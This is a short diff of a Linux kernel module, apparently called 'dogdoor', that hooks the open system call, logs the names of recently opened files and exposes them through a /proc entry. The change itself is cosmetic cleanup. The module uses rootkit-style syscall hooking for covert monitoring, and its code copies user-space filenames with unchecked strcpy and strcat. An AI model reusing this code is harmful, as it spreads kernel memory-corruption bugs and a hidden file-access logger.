@@ -27,21 +27,16 @@ asmlinkage int (*orig_sys_open)(const char __user * filename, int flags, umode_t
 
 static
 void init_filenames(const char __user * filename) {
-    /*char * is_in_slash = kmalloc(FILENAME_SIZE, GFP_KERNEL);*/
-    /*is_in_slash = strstr(filename, "/");*/
-    /*if (is_in_slash == NULL) {*/
-        if (count_accessed_filenames < FILENAME_COUNT) {
-            strcpy(accessed_filenames[count_accessed_filenames], filename);
-            count_accessed_filenames++;
-        } else {
-            int i;
-            for (i=0; i<FILENAME_COUNT - 1; i++) {
-                accessed_filenames[i] = accessed_filenames[i+1];
-            }
-            strcpy(accessed_filenames[FILENAME_COUNT - 1], filename);
-        }
-    /*}*/
-    /*kfree(is_in_slash);*/
+	if (count_accessed_filenames < FILENAME_COUNT) {
+	    strcpy(accessed_filenames[count_accessed_filenames], filename);
+	    count_accessed_filenames++;
+	} else {
+	    int i;
+	    for (i=0; i<FILENAME_COUNT - 1; i++) {
+		accessed_filenames[i] = accessed_filenames[i+1];
+	    }
+	    strcpy(accessed_filenames[FILENAME_COUNT - 1], filename);
+	}
 }
 
 asmlinkage int dogdoor_sys_open(const char __user * filename, int flags, umode_t mode)
@@ -68,7 +63,6 @@ ssize_t dogdoor_log_proc_read(struct file *file, char __user *ubuf, size_t size,
     char * cattest = kmalloc(FILENAME_SIZE * FILENAME_COUNT, GFP_KERNEL);
 
     strcpy(cattest, "LASTLY ACCESSED FILES:");
-    strcat(cattest, "\n");
     for (i=0; i<FILENAME_COUNT; i++) {
         strcat(cattest, "\n");
         strcat(cattest, accessed_filenames[i]);
